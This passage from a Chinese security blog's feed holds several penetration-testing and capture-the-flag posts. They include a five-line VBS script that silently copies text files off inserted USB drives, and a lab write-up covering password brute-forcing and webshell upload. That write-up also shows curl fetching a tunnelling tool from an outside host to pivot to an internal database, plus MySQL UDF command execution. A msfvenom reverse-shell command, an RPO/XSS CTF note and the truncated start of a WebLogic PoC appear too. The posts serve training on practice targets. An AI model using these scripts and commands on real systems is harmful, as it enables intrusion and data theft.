title="项目地址"></a>项目地址</h4><p><code>https://github.com/sensepost/reGeorg</code></p><p><code>https://github.com/nccgroup/ABPTTS</code></p><h4 id="简介-4"><a href="#简介-4" class="headerlink" title="简介"></a>简介</h4><p>两款针对Web应用程序的HTTP隧道，使用方法简单，详情查看github项目</p><hr>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;tunnel&lt;/p&gt;
    
    </summary>
    
      <category term="Pentest" scheme="https://dayu.ink/categories/Pentest/"/>
    
    
      <category term="Pentest" scheme="https://dayu.ink/tags/Pentest/"/>
    
      <category term="tunnel" scheme="https://dayu.ink/tags/tunnel/"/>
    
  </entry>
  
  <entry>
    <title>5行VBS代码实现“U盘小偷”功能</title>
    <link href="https://dayu.ink/vbs-u-disk-thief.html"/>
    <id>https://dayu.ink/vbs-u-disk-thief.html</id>
    <published>2018-11-01T12:30:58.000Z</published>
    <updated>2019-04-26T07:10:26.000Z</updated>
    
    <content type="html"><![CDATA[<p>内网渗透测试过程中，可以通过vbs脚本循环打包pc目标机的可移动盘符，在目标插入u盘时立即打包文件到目标机硬盘上。</p><a id="more"></a><h3 id="使用说明"><a href="#使用说明" class="headerlink" title="使用说明"></a>使用说明</h3><p>需要工具7za.exe，结束进程wscript.exe即可停止工作。</p><h3 id="VBS代码"><a href="#VBS代码" class="headerlink" title="VBS代码"></a>VBS代码</h3><figure class="highlight vbscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">set</span> ws=WScript.<span class="built_in">CreateObject</span>(<span class="string">"WScript.Shell"</span>)</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">ws.Run <span class="string">"C:\Windows\Temp\7za.exe a d:\1.zip -r g:\*.txt"</span>, <span class="number">0</span>, <span class="literal">true</span>   <span class="comment">'静默执行命令：打包g盘所有的txt文件到d:\1.zip</span></span><br><span class="line">WScript.Sleep <span class="number">1000</span>*<span class="number">1</span>   <span class="comment">'sleep 1秒</span></span><br><span class="line"><span class="keyword">loop</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;内网渗透测试过程中，可以通过vbs脚本循环打包pc目标机的可移动盘符，在目标插入u盘时立即打包文件到目标机硬盘上。&lt;/p&gt;
    
    </summary>
    
      <category term="Pentest" scheme="https://dayu.ink/categories/Pentest/"/>
    
    
      <category term="pentest" scheme="https://dayu.ink/tags/pentest/"/>
    
  </entry>
  
  <entry>
    <title>pockr 靶机 未授权访问引发的血案 writeup</title>
    <link href="https://dayu.ink/pockr-unauthorized-access.html"/>
    <id>https://dayu.ink/pockr-unauthorized-access.html</id>
    <published>2018-07-21T05:30:58.000Z</published>
    <updated>2019-04-26T07:10:26.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="靶场描述"><a href="#靶场描述" class="headerlink" title="靶场描述"></a>靶场描述</h2><ul><li>web类型的靶场</li><li>多查看源码，有惊喜。</li><li>要求拿到内网数据库服务器的权限，拿到网站权限还没结束！！！不只是数据库权限，是数据库那台服务器权限。</li></ul><a id="more"></a><p>题目地址：<a href="https://pockr.org/bug-environment/detail?environment_no=env_a20a1282feaae3fcbc" target="_blank" rel="noopener">https://pockr.org/bug-environment/detail?environment_no=env_a20a1282feaae3fcbc</a></p><h2 id="通过未授权访问获得用户名"><a href="#通过未授权访问获得用户名" class="headerlink" title="通过未授权访问获得用户名"></a>通过未授权访问获得用户名</h2><p><img src="https://oss.dayu.ink/pocker/1.png?x-oss-process=style/blog" alt></p><p>在<code>sea-config.js</code>中找到<code>login.js</code>和<code>api.js</code>两个重要文件，其中<code>api.js</code>未在前端中显示。</p><p><code>login.js</code>内容为：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">define(<span class="function"><span class="keyword">function</span> (<span class="params">require, exports, module</span>) </span>&#123;</span><br><span class="line">    </span><br><span class="line">    $(<span class="string">"#emailsubmit"</span>).click(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">       </span><br><span class="line">        <span class="keyword">var</span> email = $(<span class="string">"#forgotemail"</span>).val();</span><br><span class="line">        <span class="keyword">var</span> url =<span class="string">'Admin_Pockr_login/forgorpwd_action'</span>;</span><br><span class="line">        <span class="keyword">var</span> myreg = <span class="regexp">/^([\.a-zA-Z0-9_-])+@([a-zA-Z0-9_-])+(\.[a-zA-Z0-9_-])+/</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(email.length==<span class="number">0</span>)&#123;</span><br><span class="line">            alert(<span class="string">'邮箱不能为空!'</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!myreg.test(email))&#123;</span><br><span class="line">            alert(<span class="string">'邮箱格式不正确!'</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            $.post(url, &#123; <span class="attr">email</span>: email &#125;, <span class="function"><span class="keyword">function</span> (<span class="params">resultJSONObject</span>) </span>&#123;</span><br><span class="line">                <span class="keyword">if</span> (resultJSONObject.message) &#123;</span><br><span class="line">                    alert(<span class="string">"success"</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    alert(<span class="string">"failed"</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;, <span class="string">"json"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">     &#125;);</span><br><span class="line"></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p><code>Admin_Pockr_login/forgorpwd_action</code> 为找回密码的接口，</p><p>尝试post任意email后发现返回 {“message”:”false”}</p><p><img src="https://oss.dayu.ink/pocker/2.png?x-oss-process=style/blog" alt></p><p><code>api.js</code>内容为：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">define(<span class="function"><span class="keyword">function</span> (<span class="params">require, exports, module</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> $ = <span class="built_in">require</span>(<span class="string">'jquery'</span>);</span><br><span class="line">    <span class="keyword">var</span> url=<span class="string">'User_Pockr_Api/UserInfo'</span>;</span><br><span class="line">    <span class="keyword">var</span> userid=$(<span class="string">"#userid"</span>).val();</span><br><span class="line">    $.post(url, &#123; <span class="attr">userid</span>: userid &#125;, <span class="function"><span class="keyword">function</span> (<span class="params">resultJSONObject</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (resultJSONObject.message) &#123;</span><br><span class="line">            $(<span class="string">"$userinfo"</span>).append(resultJSONObject.username);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            alert(<span class="string">"error"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;, <span class="string">"json"</span>);</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>尝试post任意userid后返回{“message”:”false”,”error”:”userid format is not correct!”}</p><p><img src="https://oss.dayu.ink/pocker/3.png?x-oss-process=style/blog" alt></p><p>这时候找到首页下面的<code>技术支持: admin@pockr.com</code>，尝试post找回密码接口，返回了userid</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;message&quot;:&quot;true&quot;,&quot;email&quot;:&quot;admin@pockr.com&quot;,&quot;userid&quot;:&quot;BB568A04-8159-964E-CE49-D68AC10F8101&quot;&#125;</span><br></pre></td></tr></table></figure><p>拿到userid后post给User_Pockr_Api/UserInfo的api，返回了username</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;message&quot;:&quot;true&quot;,&quot;email&quot;:&quot;admin@pockr.com&quot;,&quot;username&quot;:&quot;sunzheyi&quot;&#125;</span><br></pre></td></tr></table></figure><h2 id="爆破进入后台"><a href="#爆破进入后台" class="headerlink" title="爆破进入后台"></a>爆破进入后台</h2><p>拿到username后通过爆破拿到密码，弱口令<code>1q2w3e</code></p><p><img src="https://oss.dayu.ink/pocker/4.png?x-oss-process=style/blog" alt></p><h3 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h3><p>进入后台后找到文件上传处，尝试上传个txt</p><p><img src="https://oss.dayu.ink/pocker/5.png?x-oss-process=style/blog" alt></p><p>看到php尝试上传一句话，上传后找不到上传目录，通过修改subSysFolder一级一级往上级目录尝试，到了第二级就传到了网站根目录。</p><p><img src="https://oss.dayu.ink/pocker/6.png?x-oss-process=style/blog" alt></p><p>最后发现执行不了，然后上传了一个system函数的文件。</p><p><img src="https://oss.dayu.ink/pocker/7.png?x-oss-process=style/blog" alt></p><p>使用perl成功反弹shell，注意命令要url编码。</p><p><img src="https://oss.dayu.ink/pocker/8.png?x-oss-process=style/blog" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">反弹shell的方法可以参考  https://evi1cg.me/archives/GetShellls.html</span><br></pre></td></tr></table></figure><p>拿到shell先去找数据库配置文件。</p><p><img src="https://oss.dayu.ink/pocker/9.png?x-oss-process=style/blog" alt></p><p>认出web使用的是CI后，在<code>application/config/database.php</code>找到了mysql的地址，账号和密码。</p><p>使用公网访问数据库地址<code>sql05.ciadmin.com</code>发现访问不了，应该是内网地址。web服务器上安装了curl，使用curl下载ew，并把<code>sql05.ciadmin.com</code>的3306端口转发到公网vps。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">先到vps打开监听</span><br><span class="line">./ew_for_linux64 -s lcx_listen -l 9999 -e 53</span><br><span class="line">回到shell执行</span><br><span class="line">curl http://1.1.1.1/ew_for_linux64 &gt; ew_for_linux64</span><br><span class="line">chmod +x ew_for_linux64</span><br><span class="line">./ew_for_linux64 -s lcx_slave -d 你的vps_ip -e 53 -f sql05.ciadmin.com -g 3306</span><br></pre></td></tr></table></figure><h2 id="UDF拿shell"><a href="#UDF拿shell" class="headerlink" title="UDF拿shell"></a>UDF拿shell</h2><p>此时连接你vps的9999端口，即对应内网mysql的3306端口。</p><p>我这里使用win下的navicat连接，也可以使用sqlmap等工具。</p><p><img src="https://oss.dayu.ink/pocker/10.png?x-oss-process=style/blog" alt></p><p>此时发现mysql账号并不是root，没有导出文件的权限，尝试用相同的密码登陆root用户，发现能登陆成功。</p><p>查询mysql版本为5.7，使用 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show variables like &quot;%plugin_dir%&quot;;</span><br></pre></td></tr></table></figure><p>查找到plugin路径。</p><p><img src="https://oss.dayu.ink/pocker/11.png?x-oss-process=style/blog" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from func; #检查是否已经有人导出过了</span><br><span class="line">mysql&gt; select unhex(&aposapos;) into dumpfile &apos;/usr/lib/mysql/plugin/udf.so&apos;;</span><br><span class="line">Query OK, 1 row affected</span><br><span class="line"></span><br><span class="line">mysql&gt; create function sys_eval returns string soname &apos;udf.so&apos;;</span><br><span class="line">Query OK, 0 rows affected</span><br><span class="line"></span><br><span class="line">mysql&gt; select sys_eval(&apos;whoami&apos;);</span><br><span class="line">+--------------------+</span><br><span class="line">| sys_eval(&apos;whoami&apos;) |</span><br><span class="line">+--------------------+</span><br><span class="line">| mysql</span><br><span class="line">             |</span><br><span class="line">+--------------------+</span><br><span class="line">1 row in set</span><br></pre></td></tr></table></figure><p>成功执行命令，获取到了数据库服务器的权限</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;靶场描述&quot;&gt;&lt;a href=&quot;#靶场描述&quot; class=&quot;headerlink&quot; title=&quot;靶场描述&quot;&gt;&lt;/a&gt;靶场描述&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;web类型的靶场&lt;/li&gt;
&lt;li&gt;多查看源码，有惊喜。&lt;/li&gt;
&lt;li&gt;要求拿到内网数据库服务器的权限，拿到网站权限还没结束！！！不只是数据库权限，是数据库那台服务器权限。&lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
      <category term="CTF" scheme="https://dayu.ink/categories/CTF/"/>
    
    
      <category term="Web" scheme="https://dayu.ink/tags/Web/"/>
    
      <category term="CTF" scheme="https://dayu.ink/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>AttackDefense Real World Webapps RCE writeup</title>
    <link href="https://dayu.ink/Real-World-Webapps-RCE.html"/>
    <id>https://dayu.ink/Real-World-Webapps-RCE.html</id>
    <published>2018-05-01T12:30:58.000Z</published>
    <updated>2019-04-26T07:10:26.000Z</updated>
    
    <content type="html"><![CDATA[<p>AttackDefense Web靶机 远程执行代码 writeup</p><a id="more"></a><hr><h3 id="ApPHP-MicroBlog"><a href="#ApPHP-MicroBlog" class="headerlink" title="ApPHP MicroBlog"></a>ApPHP MicroBlog</h3><p>exp：<code>https://www.exploit-db.com/exploits/33070</code></p><p><img src="https://oss.dayu.ink/attackdefense_rce/ApPHPMicroBlog.png?x-oss-process=style/blog" alt></p><hr><h3 id="WeBid"><a href="#WeBid" class="headerlink" title="WeBid"></a>WeBid</h3><p>exp：<code>https://www.exploit-db.com/exploits/36155</code></p><p><img src="https://oss.dayu.ink/attackdefense_rce/WeBid.png?x-oss-process=style/blog" alt></p><hr><h3 id="Joomla-com-xcloner-Component"><a href="#Joomla-com-xcloner-Component" class="headerlink" title="Joomla com_xcloner Component"></a>Joomla com_xcloner Component</h3><p>exp：<code>https://www.exploit-db.com/exploits/16246</code></p><p><img src="https://oss.dayu.ink/attackdefense_rce/Joomla_com_xcloner_Component.png?x-oss-process=style/blog" alt></p><hr><h3 id="PHP-Utility-Belt"><a href="#PHP-Utility-Belt" class="headerlink" title="PHP Utility Belt"></a>PHP Utility Belt</h3><p>exp：<code>ajax.php</code>  post 给 code 传参</p><p><img src="https://oss.dayu.ink/attackdefense_rce/PHP_Utility_Belt.png?x-oss-process=style/blog" alt></p><hr><h3 id="osCommerce"><a href="#osCommerce" class="headerlink" title="osCommerce"></a>osCommerce</h3><p>exp：<code>https://www.exploit-db.com/exploits/44374</code></p><p><img src="https://oss.dayu.ink/attackdefense_rce/osCommerce1.png?x-oss-process=style/blog" alt></p><p><img src="https://oss.dayu.ink/attackdefense_rce/osCommerce2.png?x-oss-process=style/blog" alt></p><hr><p>。。。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;AttackDefense Web靶机 远程执行代码 writeup&lt;/p&gt;
    
    </summary>
    
      <category term="AttackDefense" scheme="https://dayu.ink/categories/AttackDefense/"/>
    
    
      <category term="pentest" scheme="https://dayu.ink/tags/pentest/"/>
    
      <category term="Web" scheme="https://dayu.ink/tags/Web/"/>
    
      <category term="writeup" scheme="https://dayu.ink/tags/writeup/"/>
    
  </entry>
  
  <entry>
    <title>HackTheBox Jerry writeup</title>
    <link href="https://dayu.ink/hackthebox-Jerry-writeup.html"/>
    <id>https://dayu.ink/hackthebox-Jerry-writeup.html</id>
    <published>2018-04-01T05:30:58.000Z</published>
    <updated>2019-04-26T07:10:26.000Z</updated>
    
    <content type="html"><![CDATA[<p>去年注册完hackthebox，因为连接不上隧道一直没玩，今天连接上做道水题试试。</p><a id="more"></a><p>题目地址：<a href="https://www.hackthebox.eu/home/machines/profile/144" target="_blank" rel="noopener">https://www.hackthebox.eu/home/machines/profile/144</a></p><h2 id="端口探测"><a href="#端口探测" class="headerlink" title="端口探测"></a>端口探测</h2><p><img src="https://oss.dayu.ink/hackthebox/jerry/1.png?x-oss-process=style/blog" alt></p><p><img src="https://oss.dayu.ink/hackthebox/jerry/2.png?x-oss-process=style/blog" alt></p><p>仅开放8080，tomcat manager服务</p><h2 id="爆破弱口令"><a href="#爆破弱口令" class="headerlink" title="爆破弱口令"></a>爆破弱口令</h2><p>使用msf自带字典爆破出密码</p><p><img src="https://oss.dayu.ink/hackthebox/jerry/3.png?x-oss-process=style/blog" alt></p><h2 id="上传war包getshell"><a href="#上传war包getshell" class="headerlink" title="上传war包getshell"></a>上传war包getshell</h2><p>使用msfvenom生成反弹shell的war包</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.16.7 LPORT=8080 -f war &gt; shell.war</span><br></pre></td></tr></table></figure><p>deploy后访问getshell</p><p><img src="https://oss.dayu.ink/hackthebox/jerry/4.png?x-oss-process=style/blog" alt></p><p><img src="https://oss.dayu.ink/hackthebox/jerry/5.png?x-oss-process=style/blog" alt></p><p>拿到flag</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;去年注册完hackthebox，因为连接不上隧道一直没玩，今天连接上做道水题试试。&lt;/p&gt;
    
    </summary>
    
      <category term="HackTheBox" scheme="https://dayu.ink/categories/HackTheBox/"/>
    
    
      <category term="CTF" scheme="https://dayu.ink/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>RPO漏洞初探笔记</title>
    <link href="https://dayu.ink/RPO-Note.html"/>
    <id>https://dayu.ink/RPO-Note.html</id>
    <published>2018-03-28T05:28:58.000Z</published>
    <updated>2019-04-26T07:10:26.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="RPO攻击简介"><a href="#RPO攻击简介" class="headerlink" title="RPO攻击简介"></a>RPO攻击简介</h2><ul><li>RPO（Relative Path Overwrite），意为相对路径覆盖，利用的是客户端浏览器与服务端url解析的差异而导致的漏洞。在引入相对路径的js/css文件处，通过一定的手法，加载我们可控的文件，按照js/css的语法执行，实现XSS等攻击。</li></ul><a id="more"></a><h2 id="解析差异分析"><a href="#解析差异分析" class="headerlink" title="解析差异分析"></a>解析差异分析</h2><ul><li><p>本地测试目录结构如下<br>roptest目录: <img src="https://oss.dayu.ink/RPO/1.png?x-oss-process=style/blog" alt><br>roptest/xxx目录: <img src="https://oss.dayu.ink/RPO/2.png?x-oss-process=style/blog" alt><br>roptest目录下的rop.php代码为</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;head&gt;</span><br><span class="line">    &lt;title&gt;ROP&lt;/title&gt;</span><br><span class="line">        &lt;script src=./a.js&gt;&lt;/script&gt;</span><br><span class="line">    &lt;/head&gt;</span><br><span class="line">    &lt;body&gt;</span><br><span class="line">    <span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="string">"Hello dayu, this is roptest/rop.php"</span> <span class="meta">?&gt;</span></span><br><span class="line">    &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></li><li><p>roptest目录下的a.js代码为</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alert(<span class="string">"I'm from roptest"</span>)</span><br></pre></td></tr></table></figure></li><li><p>roptest/xxx目录下的a.js代码为</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alert(<span class="string">"I'm from xxx"</span>)</span><br></pre></td></tr></table></figure></li><li><p>当我们使用chrome访问 <code>http://127.0.0.1/roptest/rop.php</code> 时：<br><img src="https://oss.dayu.ink/RPO/3.png?x-oss-process=style/blog" alt></p></li><li><p>访问 <code>http://127.0.0.1/roptest/xxx/..%2frop.php</code> 时：<br><img src="https://oss.dayu.ink/RPO/4.png?x-oss-process=style/blog" alt></p></li><li><p>至此，我们已经可以看出这种攻击的条件：<br>HTML代码中采用了相对路径来引入js或者css等文件<br>服务端能够正常解析%2f等url编码（刚开始自测nginx可以构成漏洞，apache不行，后来查了一下：apache如果要支持%2f的话，需要将AllowEncodedSlashes设置为On。一般在配置了pathinfo后，会将这个选项打开。）<br>客户端浏览器在寻找js资源的时候，并没有对%2f进行解码</p></li></ul><h2 id="第二届强网杯-Share-your-mind"><a href="#第二届强网杯-Share-your-mind" class="headerlink" title="第二届强网杯 Share your mind"></a>第二届强网杯 Share your mind</h2><ul><li><p>题目描述</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://39.107.33.96:20000</span><br><span class="line">Please help me find the vulnerability before I finish this site！</span><br><span class="line">hint：xss bot使用phantomjs，版本2.1.1</span><br><span class="line">hint2: xss的点不在report页面</span><br></pre></td></tr></table></figure></li><li><p>这道题的漏洞点就在于RPO<br><img src="https://oss.dayu.ink/RPO/5.png?x-oss-process=style/blog" alt></p></li><li><p>复现过程<br>发表一个title为空,内容为<code>alert(1)</code>的article，访问为纯文本<br><img src="https://oss.dayu.ink/RPO/6.png?x-oss-process=style/blog" alt></p></li><li><p>由于站点使用了pathinfo的url模式，</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://39.107.33.96:20000/index.php/view/article/1866</span><br></pre></td></tr></table></figure></li><li><p>类似相当于</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://39.107.33.96:20000/index.php?m=view&amp;article=1866</span><br></pre></td></tr></table></figure></li><li><p>同时，浏览器按照phpinfo的格式来解析url的话，只会访问到能识别的地方<br><img src="https://oss.dayu.ink/RPO/7.png?x-oss-process=style/blog" alt></p></li><li><p>所以，当我们访问</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://39.107.33.96:20000/index.php/view/article/1866/..%2f..%2f/</span><br></pre></td></tr></table></figure></li><li><p>浏览器会到达</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://39.107.33.96:20000/index.php/view/</span><br></pre></td></tr></table></figure></li><li><p>同时，该页面底部通过相对路径加载的两个js会去尝试加载</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://39.107.33.96:20000/index.php/view/article/1866/../static/js/jquery.min.js</span><br><span class="line">和http://39.107.33.96:20000/index.php/view/article/1866/../static/js/bootstrap.min.js</span><br></pre></td></tr></table></figure></li><li><p>由于这两个文件不存在且加上上面的pathinfo原则，这两个<code>&lt;script src=&quot;&quot;&gt;</code>实际会加载</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://39.107.33.96:20000/index.php/view/article/1866</span><br></pre></td></tr></table></figure></li><li><p>所以此时会出现两个alert(1)弹窗，形成了xss攻击。<br><img src="https://oss.dayu.ink/RPO/8.png?x-oss-process=style/blog" alt></p></li><li><p>最后，在report页面只能提交当前站点url，于是我们通过上述方法构造xss提交，”盲打”，获取到flag。<br><img src="https://oss.dayu.ink/RPO/9.png?x-oss-process=style/blog" alt></p></li><li><p>附上解决md5的脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> multiprocessing</span><br><span class="line"><span class="keyword">from</span> os <span class="keyword">import</span> urandom</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">processor_number = multiprocessing.cpu_count()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">work</span><span class="params">(cipher)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">100</span>):</span><br><span class="line">        plain = urandom(<span class="number">16</span>).encode(<span class="string">'hex'</span>)</span><br><span class="line">        <span class="keyword">if</span> md5(plain).hexdigest()[:<span class="number">6</span>] == cipher:</span><br><span class="line">            <span class="keyword">print</span> plain</span><br><span class="line">            sys.exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    cipher = raw_input(<span class="string">'md5:'</span>)</span><br><span class="line">    pool = multiprocessing.Pool(processes=processor_number)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        plain = urandom(<span class="number">16</span>).encode(<span class="string">'hex'</span>)</span><br><span class="line">        pool.apply_async(work, (cipher, ))</span><br><span class="line">    pool.close()</span><br><span class="line">    pool.join()</span><br></pre></td></tr></table></figure></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;RPO攻击简介&quot;&gt;&lt;a href=&quot;#RPO攻击简介&quot; class=&quot;headerlink&quot; title=&quot;RPO攻击简介&quot;&gt;&lt;/a&gt;RPO攻击简介&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;RPO（Relative Path Overwrite），意为相对路径覆盖，利用的是客户端浏览器与服务端url解析的差异而导致的漏洞。在引入相对路径的js/css文件处，通过一定的手法，加载我们可控的文件，按照js/css的语法执行，实现XSS等攻击。&lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
      <category term="Web" scheme="https://dayu.ink/categories/Web/"/>
    
    
      <category term="Web" scheme="https://dayu.ink/tags/Web/"/>
    
      <category term="RPO" scheme="https://dayu.ink/tags/RPO/"/>
    
  </entry>
  
  <entry>
    <title>WebLogic CVE-2017-3506 Poc</title>
    <link href="https://dayu.ink/CVE-2017-3506_Poc.html"/>
    <id>https://dayu.ink/CVE-2017-3506_Poc.html</id>
    <published>2017-12-23T12:30:58.000Z</published>
    <updated>2019-04-26T07:10:26.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="漏洞编号"><a href="#漏洞编号" class="headerlink" title="漏洞编号"></a>漏洞编号</h2><ul><li>CVE-2017-3506 （wls-wsat 远程命令执行漏洞）</li></ul><a id="more"></a><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><ul><li>Oracle WebLogic Server10.3.6.0.0 版本</li><li>Oracle WebLogic Server12.1.3.0.0 版本</li><li>Oracle WebLogic Server12.2.1.1.0 版本</li><li>Oracle WebLogic Server12.2.1.2.0 版本</li></ul><h2 id="Poc"><a href="#Poc" class="headerlink" title="Poc"></a>Poc</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td 